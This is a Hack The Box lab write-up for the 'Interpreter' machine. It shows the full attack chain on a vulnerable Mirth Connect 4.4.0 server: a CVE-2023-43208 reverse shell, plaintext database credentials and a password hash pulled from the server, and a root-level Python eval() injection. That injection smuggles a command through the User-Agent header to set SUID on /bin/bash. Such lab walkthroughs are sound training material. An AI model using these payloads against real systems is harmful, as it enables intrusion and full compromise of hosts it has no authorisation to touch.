---
name: Interpreter
starting_date: 2026-04-16
modified: 2026-04-16T19:21:58+03:00
private: true
tags:
machine_link: https://hackthebox.com/machines
difficulty: medium
created: 2026-04-16T14:34:04+03:00
---
## First step
Analyze this service with the classic `nmap`.
```bash
➜ ~ nmap -sV 10.129.244.184
{{---}}
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-16 14:38 +03
Nmap scan report for 10.129.244.184
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp  open  http     Jetty
443/tcp open  ssl/http Jetty
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds
```
We got three services:
- `22 SSH`
- `80 webserver http`
- `443 webserver https`
---
Apparently, we have these two *Mirth Connect* services.. *Mirth* is a open source data integration engine used in the healthcare industry. When we click the green button, the system generates a `.jnlp` file. This is a Java Network Launch Protocol file, which is essentially a configuration file. We can read this file to determine exactly which version of the service is running to search for relevant CVEs.

---
The number version is `4.4.0` as we can see from the configuration file or form:
```bash
curl -k -H 'X-Requested-With: OpenAPI' 
{{---}}
https://10.129.244.184/api/server/version
4.4.0
```


### Port 443
![[https_Service.png]]

### Port 80
![[port_80_service.png]]
Doing some research we can find this vuln CVE-2023-43208. I'm using this [POC](https://github.com/az4rvs/Mirth-Connect-CVE-2023-43208). We open a `rlwrap -cAr nc -lvnp 4444` and run
```bash
uv run --with requests --with urllib3 CVE-2023-43208.py https://10.129.244.184:443 10.10.15.219 4444
```
we got a reverse shell. now we can stabilize it
## Diving inside the mirth
We have to look for some credentials
### SQL
running `cat /usr/local/mirthconnect/conf/mirth.properties`, we can find the credentials for the SQL server:
```
# database credentials
database.username = mirthdb
database.password = MirthPass123!
```
looking inside the db we have just one user with id `2` username `sedric`. We can retrive also the hash of the password `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`. 
Since we don't have the salt separate in the table, it means it is embedded inside the hash string. We can use this small script to extract it:
```bash
python3 -c '
import base64
b64_string = "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="
decoded = base64.b64decode(b64_string)
salt = decoded[:8].hex()
hash_val = decoded[8:].hex()
print(f"Hashcat format -> {hash_val}:{salt}")
'
{{---}}
Hashcat format -> 62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb:bbff8b0413949da7
```
The problem is that the password is hashed 1000 times. Since Hashcat doesn't have a default module for this specific iteration count, we would have to write a custom script, which seems like a rabbit hole.
### Take information from CHANNEL table
The `CONFIGURATION` table just holds the global server settings (like the SMTP timeout and pruner settings you saw). In my previous message, I recommended dumping the **`CHANNEL`** table.

---
We don't find a hardcoded password in this channel, but you found something much better: **the next step in the internal network.**

Let's break down exactly what this XML configuration is telling you. This is the pipeline for the `INTERPRETER - HL7 TO XML TO NOTIFY` channel:

### 1. The Input (Source Connector)
```xml
<listenerConnectorProperties version="4.4.0">
  <host>0.0.0.0</host>
  <port>6661</port>
</listenerConnectorProperties>
```

The Mirth service is listening on port **6661** for incoming HL7 messages.

### 2. The Transformation

It takes specific parts of the HL7 message (like First Name, Last Name, Birth Date, ID) and maps them into an XML structure that looks like this:
```xml
<patient>
  <timestamp>...</timestamp>
  <sender_app>...</sender_app>
  <id>...</id>
  ...
</patient>
```

### 3. The Output (Destination Connector)

This is the critical part. Look where it sends that XML data:
```xml
<host>http://127.0.0.1:54321/addPatient</host>
<method>post</method>
```
Mirth is taking the HL7 data from port 6661, wrapping it in XML, and POSTing it to a **hidden local service running on port 54321**.

### Investigating the AddPatient API

Since Mirth is forwarding the XML data to a local service on port `54321`, we need to find out what is actually listening on that port. We can check the running Python processes:
```bash
mirth@interpreter:~$ ps aux | grep -i python
root        3516  0.0  0.6 401236 26060 ?        Ssl  07:37   0:03 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
root        3520  0.0  0.7 113604 31620 ?        Ss   07:37   0:01 /usr/bin/python3 /usr/local/bin/notif.py
```

We spot a custom script named `/usr/local/bin/notif.py`. Critically, this script is running as **root**. If we try to read it with `cat`, we get a `Permission denied` error. This means we are dealing with a blind exploitation scenario.

We can interact with this internal API directly using `wget` (since `curl` is not installed on the target) by simulating the XML payload that Mirth would normally send.

First, we send a baseline request with all the expected fields. After some trial and error with the `<birth_date>` format (which returns `[INVALID_DOB]` for incorrect formats), we find that `YYYY-MM-DD` or `MM/DD/YYYY` works.

```bash
wget -O- --header="Content-Type: application/xml" --post-data='<patient><timestamp>1758491905824</timestamp><sender_app>WEBAPP</sender_app><id>2</id><firstname>test</firstname><lastname>user</lastname><birth_date>02/05/1985</birth_date><gender>M</gender></patient>' http://127.0.0.1:54321/addPatient
```

### Discovering the Vulnerability
To test for injection vulnerabilities, we inject Python string formatting payloads into the `<firstname>` field. When we send `{{d}}`, the server responds with `{d}`. When we send `{request.__class__}`, we get an `[EVAL_ERROR]`.

This proves the application is insecurely formatting our input into a string and then passing it directly into Python's dangerous `eval()` function! Since we can execute Python code, we can use the `open().read()` function to read the source code of `notif.py` that was previously denied to us.

**Leaking the Source Code:**
```bash
wget -O- --header="Content-Type: application/xml" --post-data="<patient><timestamp>1758491905824</timestamp><sender_app>WEBAPP</sender_app><id>2</id><firstname>{open('/usr/local/bin/notif.py').read()}</firstname><lastname>cr7</lastname><birth_date>02/05/1985</birth_date><gender>M</gender></patient>" http://127.0.0.1:54321/addPatient
```

### Analyzing the Source Code

Reviewing the dumped source code reveals why standard command injections (like `$(chmod +s /bin/bash)`) were failing:
```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

1. **The Filter:** The application uses a strict Regex `pattern` that blocks spaces, commas, dashes, and other special characters. If any of these are detected, it returns `[INVALID_INPUT]`.
    
2. **The Sink:** The application passes our input into an f-string which is then evaluated using `eval()`, leading to Remote Code Execution (RCE).
    

### The Regex Bypass and Root Escalation

We need to execute a bash command (which requires spaces, like `chmod +s /bin/bash`) without putting any spaces in the XML payload.

To bypass this, we can place our bash command inside an HTTP header (like the `User-Agent`), which is not checked by the Regex. Then, in the XML payload, we tell the Python `eval()` function to extract the User-Agent string and execute it using `os.system()`.

**The Final Exploit:**
```bash
wget -O- -U 'chmod +s /bin/bash' --header="Content-Type: application/xml" --post-data="<patient><timestamp>1758491905824</timestamp><sender_app>WEBAPP</sender_app><id>2</id><firstname>{__import__('os').system(str(request.user_agent))}</firstname><lastname>cr7</lastname><birth_date>02/05/1985</birth_date><gender>M</gender></patient>" http://127.0.0.1:54321/addPatient
```

Because the `notif.py` script is running as `root`, the `os.system()` call successfully sets the SUID bit on the bash binary.

We can verify the permissions and drop into a root shell:
```bash
mirth@interpreter:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1265648 Sep  6  2025 /bin/bash

mirth@interpreter:~$ bash -p
root@interpreter:~# id
uid=103(mirth) gid=111(mirth) euid=0(root) egid=0(root) groups=0(root),111(mirth)
root@interpreter:~# cat /root/root.txt
```

Machine completely pwned!
